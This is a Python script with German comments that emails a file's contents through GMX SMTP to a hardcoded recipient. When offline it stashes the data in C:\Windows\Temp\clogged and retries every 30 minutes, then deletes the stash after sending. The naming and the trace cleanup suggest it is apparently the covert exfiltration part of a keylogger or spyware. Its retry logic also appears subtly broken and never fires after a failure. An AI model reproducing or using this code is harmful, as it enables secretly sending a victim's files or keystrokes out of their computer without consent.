import smtplib
from email.message import EmailMessage
import time
import sys
import socket
from threading import Thread
import os

class email_sender_class:
    def email_sender_funk(self,datei_pfad,datei_name):
        global connection_on
        connection_on=""

        
        # Email_Infos
        me=""   #Sender E-Mail
        password=""    #Password des senders
        you=""  #Empfänger E-Mail
        textfile=datei_pfad+datei_name

        # zu öffnende Datei
        with open(textfile) as fp:
            msg = EmailMessage()
            msg.set_content(fp.read())
        
        # Internet checker
        def datei_stockt_stagged(): #Datei verschieben
                with open(textfile,"r")as old_file:        # von datei in neue datei schreiben
                        with open("C:\\Windows\\Temp\\clogged","a")as new_file:       # PFAD ANPASSEN!
                                for element in old_file:
                                        new_file.write(element)
                old_file.close()
                new_file.close()

        def check_connect():
                while True:
                        time.sleep(1800) #standart ist 1800 = 30 min
                        if connection_on==1:    # jede 30 minuten prüfen ob eine verbindung besteht
                                
                                with open("C:\\Windows\\Temp\\clogged","r")as read_file:              # PFAD ANPASSEN!
                                        pfad_zu_senden = "C:\\Windows\\Temp\\clogged"                 # PFAD ANPASSEN!
                                        stocked = EmailMessage()
                                        stocked.set_content(read_file.read())
                                        stocked['Subject'] = f'The contents of {pfad_zu_senden}'
                                        stocked['From'] = me
                                        stocked['To'] = you
                                        s2 = smtplib.SMTP('mail.gmx.net',587)
                                        s2.starttls()    
                                        s2.login(me, password)   
                                        s2.send_message(stocked)     
                                        s2.quit()
                                        time.sleep(60) # 1 minute
                                        os.remove("C:\\Windows\\Temp\\clogged")               # PFAD ANPASSEN!
                                        time.sleep(5)
                                        break
        
        internet_checker=Thread(target=check_connect)
        msg['Subject'] = f'The contents of {textfile}'
        msg['From'] = me
        msg['To'] = you

        try:
                s = smtplib.SMTP('mail.gmx.net',587)
                s.starttls()
                s.login(me, password)
                s.send_message(msg)
                s.quit()    
                connection_on=1 # Internet ist an

        except socket.gaierror:
                connection_on=0
                datei_stockt_stagged()
                internet_checker.start()
                        

